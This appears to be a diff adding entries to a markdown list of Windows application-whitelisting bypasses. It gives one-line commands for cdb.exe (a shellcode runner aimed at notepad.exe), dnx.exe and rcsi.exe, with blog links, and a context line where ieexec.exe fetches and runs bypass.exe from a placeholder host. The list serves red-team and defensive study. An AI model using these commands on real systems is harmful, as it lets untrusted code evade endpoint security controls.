@@ -151,3 +151,40 @@ ieexec.exe http://x.x.x.x:8080/bypass.exe
 
 Links:  
 https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/
+
+
+
+## 16. cdb.exe
+
+cdb.exe -cf x64_calc.wds -o notepad.exe
+
+Links:  
+http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html
+
+
+## 17. dnx.exe
+
+dnx.exe consoleapp
+
+Links:  
+https://enigma0x3.net/2016/11/17/bypassing-application-whitelisting-by-using-dnx-exe/
+
+
+
+## 18. rcsi.exe
+
+rcsi.exe bypass.csx
+
+Links:  
+https://enigma0x3.net/2016/11/21/bypassing-application-whitelisting-by-using-rcsi-exe/
+
+
+
+## 19. csi.exe
+
+Missing example
+
+Links:  
+https://web.archive.org/web/20161008143428/http://subt0x10.blogspot.com/2016/09/application-whitelisting-bypass-csiexe.html
+
+
